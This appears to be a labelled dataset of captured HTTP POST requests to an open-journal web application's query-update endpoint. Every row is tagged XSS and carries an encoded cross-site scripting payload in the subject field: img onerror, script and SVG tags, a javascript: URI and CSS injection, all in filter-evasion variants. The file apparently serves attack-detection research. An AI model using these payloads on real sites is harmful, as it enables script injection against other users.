request_id,timestamp,method,uri,query_string,query_params_json,host,user_agent,content_type,accept,referer,cookie_hash,authorization_type,x_forwarded_for,body_truncated,body_len_original,source_ip,source_port,server_ip,server_port,proto,pcap_file,tcp_flags,tcp_flags_str,response_status,response_headers_json,response_size,response_time_ms,response_body_truncated,response_body_len_original,headers_raw,label
f60158f3432a7218c7119e20f39faa39,"Fri, 12 Jun 2026 07:50:43 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3c![%3e%3cimg%20src%3d%22]%3e%3cimg%20src%3dx%20onerror%3dalert(XSS)%2f%2f%22%3e&comment=This%20paper%20examines%20carbon%20sequestration%20potential%20in%20reforestation%20projects%20and%20evaluates%20their%20cost-effectiveness%20as%20climate%20change%20mitigation%20strategies%2e&submitFormButton=,394,172.19.2.40,44360,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
43ae03a7c8ec81e93ae0885e1b72e51f,"Fri, 12 Jun 2026 07:50:43 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3cstyle%3e%3cimg%20src%3d%22%3c%2fstyle%3e%3cimg%20src%3dx%20onerror%3dalert(XSS)%2f%2f%22%3e&comment=This%20article%20examines%20the%20emerging%20role%20of%20blockchain%20technology%20in%20supply%20chain%20transparency%20and%20how%20it%20reduces%20fraud%20in%20international%20trade%2e&submitFormButton=,399,172.19.2.40,44384,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
1289c8a03afb077b5efeca8f0e2f497d,"Fri, 12 Jun 2026 07:50:43 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3c%3f%20foo%3d%22%3e%3cscript%3ealert(1)%3c%2fscript%3e%22%3e&comment=A%20comprehensive%20study%20on%20the%20psychological%20effects%20of%20social%20media%20usage%20among%20teenagers%20and%20its%20correlation%20with%20anxiety%20and%20depression%2e&submitFormButton=,360,172.19.2.40,44368,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
b234ab6c2019f83dc3d0fba0510930ac,"Fri, 12 Jun 2026 07:50:43 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3c!%20foo%3d%22%3e%3cscript%3ealert(1)%3c%2fscript%3e%22%3e&comment=The%20paper%20discusses%20innovative%20approaches%20to%20plastic%20waste%20reduction%20in%20coastal%20communities%20and%20successful%20implementation%20of%20circular%20economy%20models%2e&submitFormButton=,368,172.19.2.40,44390,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
50b23b8397b5b9c5dc7aa2e5154ea8e5,"Fri, 12 Jun 2026 07:50:43 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3c%2f%20foo%3d%22%3e%3cscript%3ealert(1)%3c%2fscript%3e%22%3e&comment=An%20analysis%20of%20remote%20work%20productivity%20metrics%20reveals%20that%20flexible%20schedules%20improve%20employee%20performance%20while%20reducing%20operational%20costs%2e&submitFormButton=,361,172.19.2.40,44380,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
f7cfabf3b5860e039236074c2a74923a,"Fri, 12 Jun 2026 07:50:43 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3c%3f%20foo%3d%22%3e%3cx%20foo%3d'%3f%3e%3cscript%3ealert(1)%3c%2fscript%3e'%3e%22%3e&comment=This%20research%20explores%20how%20machine%20learning%20algorithms%20can%20predict%20disease%20outbreaks%20weeks%20before%20traditional%20surveillance%20methods%20detect%20them%2e&submitFormButton=,386,172.19.2.40,44372,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
5df4d454817908dd277084b031576b3f,"Fri, 12 Jun 2026 07:50:43 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3c!%20foo%3d%22[[[Inception]]%22%3e%3cx%20foo%3d%22]foo%3e%3cscript%3ealert(1)%3c%2fscript%3e%22%3e&comment=The%20article%20investigates%20the%20impact%20of%20artificial%20intelligence%20on%20job%20displacement%20across%20manufacturing%20and%20service%20industries%20in%20developing%20nations%2e&submitFormButton=,408,172.19.2.40,44340,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
6d7f0a866d7f572bb0a071303a1e4cd2,"Fri, 12 Jun 2026 07:50:43 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3c%%20foo%3e%3cx%20foo%3d%22%%3e%3cscript%3ealert(123)%3c%2fscript%3e%22%3e&comment=A%20detailed%20examination%20of%20renewable%20energy%20adoption%20barriers%20in%20rural%20regions%20and%20policy%20solutions%20to%20accelerate%20solar%20and%20wind%20implementation%2e&submitFormButton=,380,172.19.2.40,44382,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
a01f22207e5c7548ac2152a3acbe6941,"Fri, 12 Jun 2026 07:50:44 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3cdiv%20style%3d%22font-family%3a'foo%26%2310%3b%3bcolor%3ared%3b'%3b%22%3eLOL&comment=The%20study%20analyzes%20cybersecurity%20vulnerabilities%20in%20IoT%20devices%20and%20proposes%20a%20framework%20for%20securing%20smart%20home%20ecosystems%2e&submitFormButton=,358,172.19.2.40,44330,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
070717b8742fcca48107ea72cf64cecb,"Fri, 12 Jun 2026 07:50:44 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,"csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=LOL%3cstyle%3e%2a%7b%2f%2aall%2a%2fcolor%2f%2aall%2a%2f%3a%2f%2aall%2a%2fred%2f%2aall%2a%2f%3b%2f[0]%2aIE,Safari%2a[0]%2fcolor%3agreen%3bcolor%3abl%2f%2aIE%2a%2fue%3b%7d%3c%2fstyle%3e&comment=This%20paper%20reviews%20climate%20adaptation%20strategies%20for%20agriculture,%20focusing%20on%20drought-resistant%20crop%20varieties%20and%20precision%20farming%20techniques%2e&submitFormButton=",482,172.19.2.40,44344,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
489e6a6562916ed96ff614c4375072e5,"Fri, 12 Jun 2026 07:50:44 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3cscript%3e(%7b0%3a%230%3dalert%2f%230%23%2f%230%23(0)%7d)%3c%2fscript%3e&comment=An%20exploration%20of%20virtual%20reality%20applications%20in%20medical%20training%20demonstrates%20improved%20surgical%20skill%20acquisition%20compared%20to%20traditional%20education%20methods%2e&submitFormButton=,391,172.19.2.40,44360,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
dfa06d32c604b9ed0a4d30176a8bfd6d,"Fri, 12 Jun 2026 07:50:44 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%3csvg%20xmlns%3d%22http%3a%2f%2fwww%2ew3%2eorg%2f2000%2fsvg%22%3eLOL%3cscript%3ealert(123)%3c%2fscript%3e%3c%2fsvg%3e&comment=The%20article%20discusses%20the%20economic%20implications%20of%20cryptocurrency%20regulation%20and%20its%20effect%20on%20fintech%20innovation%20in%20Southeast%20Asia%2e&submitFormButton=,407,172.19.2.40,44384,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
b11289c1afd499a73ae8429731ed3e6d,"Fri, 12 Jun 2026 07:50:44 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bSCRIPT%26gt%3balert(%2fXSS%2f%26%2346%3bsource)%26lt%3b%2fSCRIPT%26gt%3b&comment=A%20comprehensive%20review%20of%20mental%20health%20interventions%20in%20corporate%20environments%20shows%20that%20workplace%20wellness%20programs%20reduce%20employee%20burnout%20significantly%2e&submitFormButton=,396,172.19.2.40,44372,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
479714bc5a27934076476c1045238940,"Fri, 12 Jun 2026 07:50:44 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%5c%5c%22%3balert('XSS')%3b%2f%2f&comment=This%20research%20examines%20the%20effectiveness%20of%20AI-powered%20customer%20service%20chatbots%20and%20their%20limitations%20in%20handling%20complex%20client%20interactions%2e&submitFormButton=,333,172.19.2.40,44368,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
c712fb5b1904302447c637625a28dbb4,"Fri, 12 Jun 2026 07:50:44 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3b%2fTITLE%26gt%3b%26lt%3bSCRIPT%26gt%3balert(%5c%22XSS%5c%22)%3b%26lt%3b%2fSCRIPT%26gt%3b&comment=The%20paper%20investigates%20educational%20disparities%20in%20STEM%20fields%20and%20proposes%20mentorship%20programs%20to%20increase%20diversity%20among%20young%20scientists%2e&submitFormButton=,393,172.19.2.40,44380,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
d926b1c78f679b0fb3f54fab8af907c3,"Fri, 12 Jun 2026 07:50:44 GMT",POST,/index.php/publicknowledge/$$$call$$$/grid/queries/queries-grid/update-query?queryId=9&wasNew=&submissionId=16&stageId=1,queryId=9&wasNew=&submissionId=16&stageId=1,{},10.34.100.110,Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0,application/x-www-form-urlencoded; charset=UTF-8,"application/json, text/javascript, */*; q=0.01",http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1,e5c2193a8a0a6c0f,,,"csrfToken=[MASKED]&users%5B%5D=32&users%5B%5D=5&users%5B%5D=1&subject=%26lt%3bINPUT%20TYPE%3d%5c%22IMAGE%5c%22%20SRC%3d%5c%22javascript%26%23058%3balert('XSS')%3b%5c%22%26gt%3b&comment=An%20analysis%20of%20urban%20green%20spaces%20reveals%20their%20significant%20impact%20on%20air%20quality,%20property%20values,%20and%20citizen%20mental%20health%2e&submitFormButton=",391,172.19.2.40,44390,10.34.100.110,80,TCP,,,,0,{},0,-1,,0,"{""referer"": ""http://10.34.100.110/index.php/publicknowledge/workflow/index/16/1"", ""content-type"": ""application/x-www-form-urlencoded; charset=UTF-8"", ""user-agent"": ""Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0"", ""origin"": ""http://10.34.100.110"", ""cookie"": ""[MASKED]"", ""priority"": ""u=0"", ""accept-language"": ""en-US,en;q=0.5"", ""x-requested-with"": ""XMLHttpRequest"", ""host"": ""10.34.100.110"", ""accept"": ""application/json, text/javascript, */*; q=0.01"", ""accept-encoding"": ""gzip, deflate, br"", ""connection"": ""keep-alive""}",XSS
